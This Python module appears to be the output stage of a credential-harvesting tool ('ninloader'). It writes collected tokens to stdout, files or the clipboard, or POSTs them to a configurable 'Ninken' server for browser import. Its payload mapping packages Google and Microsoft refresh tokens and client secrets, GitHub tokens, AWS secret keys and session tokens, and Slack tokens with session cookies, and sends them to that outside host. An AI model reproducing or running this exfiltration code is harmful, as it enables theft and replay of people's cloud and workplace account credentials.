"""Output handlers — file, stdout, clipboard, ninken server."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from abc import ABC, abstractmethod
from datetime import datetime, timezone
from pathlib import Path
from typing import List

from ..types import CollectedToken
from ..platform_utils import get_platform


class OutputHandler(ABC):
    """Abstract base for token output."""

    @abstractmethod
    def write(self, tokens: List[CollectedToken]) -> None:
        """Write collected tokens to the output destination."""


class StdoutOutput(OutputHandler):
    """Print tokens as JSON to stdout."""

    def write(self, tokens: List[CollectedToken]) -> None:
        if not tokens:
            print("[]")
            return
        data = [t.to_ninken_dict() for t in tokens]
        print(json.dumps(data, indent=2, default=str))


class FileOutput(OutputHandler):
    """Write tokens to individual JSON files with restrictive permissions."""

    def __init__(self, output_dir: str = "./tokens"):
        self.output_dir = output_dir

    def write(self, tokens: List[CollectedToken]) -> None:
        if not tokens:
            print("No tokens to write.")
            return

        os.makedirs(self.output_dir, exist_ok=True)

        for token in tokens:
            ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
            filename = f"{token.service}_{token.source}_{ts}.json"
            filepath = os.path.join(self.output_dir, filename)

            data = json.dumps(token.to_ninken_dict(), indent=2, default=str)

            # Write with restrictive permissions (0o600 = owner read/write only)
            fd = os.open(filepath, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            try:
                os.write(fd, data.encode("utf-8"))
            finally:
                os.close(fd)

            print(f"Written: {filepath}")


class ClipboardOutput(OutputHandler):
    """Copy token JSON to system clipboard."""

    def write(self, tokens: List[CollectedToken]) -> None:
        if not tokens:
            print("No tokens to copy.")
            return

        data = [t.to_ninken_dict() for t in tokens]
        text = json.dumps(data, indent=2, default=str)

        plat = get_platform()
        try:
            if plat == "macos":
                proc = subprocess.Popen(
                    ["pbcopy"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                proc.communicate(input=text.encode("utf-8"))
            elif plat == "windows":
                proc = subprocess.Popen(
                    ["clip"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                proc.communicate(input=text.encode("utf-8"))
            else:
                # Try xclip first, then xsel
                for cmd in [["xclip", "-selection", "clipboard"], ["xsel", "--clipboard", "--input"]]:
                    try:
                        proc = subprocess.Popen(
                            cmd,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )
                        proc.communicate(input=text.encode("utf-8"))
                        break
                    except FileNotFoundError:
                        continue
                else:
                    print("Error: No clipboard utility found (install xclip or xsel)", file=sys.stderr)
                    return

            print(f"Copied {len(tokens)} token(s) to clipboard.")
        except Exception as e:
            print(f"Clipboard error: {e}", file=sys.stderr)


class NinkenOutput(OutputHandler):
    """POST tokens to a Ninken server's /api/auth endpoint."""

    def __init__(self, ninken_url: str):
        self.ninken_url = ninken_url.rstrip("/")

    def write(self, tokens: List[CollectedToken]) -> None:
        if not tokens:
            print("No tokens to send.")
            return

        try:
            import urllib.request
            import urllib.error
        except ImportError:
            print("Error: urllib not available", file=sys.stderr)
            return

        for token in tokens:
            payload = self._to_ninken_payload(token)
            data = json.dumps(payload).encode("utf-8")

            # Use /api/auth/import which stores server-side for browser pickup
            url = f"{self.ninken_url}/api/auth/import"
            req = urllib.request.Request(
                url,
                data=data,
                headers={
                    "Content-Type": "application/json",
                    "Origin": self.ninken_url,
                },
                method="POST",
            )

            try:
                with urllib.request.urlopen(req, timeout=30) as resp:
                    status = resp.status
                    if 200 <= status < 300:
                        body = json.loads(resp.read().decode("utf-8"))
                        import_url = body.get("importUrl", "")
                        print(f"Sent {token.service}/{token.source} [{status}]")
                        if import_url:
                            print(f"  → Open in browser: {import_url}")
                    else:
                        body = resp.read().decode("utf-8", errors="replace")
                        print(f"Warning: {url} returned {status}: {body}", file=sys.stderr)
            except urllib.error.URLError as e:
                print(f"Error sending to {url}: {e}", file=sys.stderr)

    def _to_ninken_payload(self, token: CollectedToken) -> dict:
        """Transform a CollectedToken to the Ninken /api/auth payload format.

        Maps to provider-specific shapes based on token.service.
        """
        base = token.to_ninken_dict()

        # Map to Ninken's expected format per provider
        t = base["token"]
        payload = {
            "platform": token.service,
            "source": f"ninloader:{token.source}",
        }

        if token.service == "google":
            payload.update({
                "access_token": t.get("access_token"),
                "refresh_token": t.get("refresh_token"),
                "client_id": t.get("client_id"),
                "client_secret": t.get("client_secret"),
                "token_uri": t.get("token_uri"),
                "scopes": t.get("scopes"),
            })
        elif token.service == "microsoft":
            payload.update({
                "access_token": t.get("access_token"),
                "refresh_token": t.get("refresh_token"),
                "client_id": t.get("client_id"),
                "tenant_id": base["account"].get("tenant_id"),
                "foci": t.get("foci"),
            })
        elif token.service == "github":
            payload.update({
                "token": t.get("access_token"),
                "username": base["account"].get("username"),
            })
        elif token.service == "aws":
            payload.update({
                "access_key_id": t.get("access_token"),
                "secret_access_key": t.get("client_secret"),
                "session_token": t.get("extra", {}).get("session_token"),
                "region": t.get("extra", {}).get("region"),
            })
        elif token.service == "slack":
            payload.update({
                "token": t.get("access_token"),
                "cookie": t.get("extra", {}).get("d_cookie"),
            })
        else:
            payload.update(t)

        return payload


def get_output_handler(output_type: str, **kwargs) -> OutputHandler:
    """Factory for output handlers."""
    if output_type == "stdout":
        return StdoutOutput()
    elif output_type == "file":
        return FileOutput(output_dir=kwargs.get("path", "./tokens"))
    elif output_type == "clipboard":
        return ClipboardOutput()
    elif output_type == "ninken":
        url = kwargs.get("ninken_url")
        if not url:
            raise ValueError("--ninken-url is required for ninken output")
        return NinkenOutput(url)
    else:
        raise ValueError(f"Unknown output type: {output_type}")
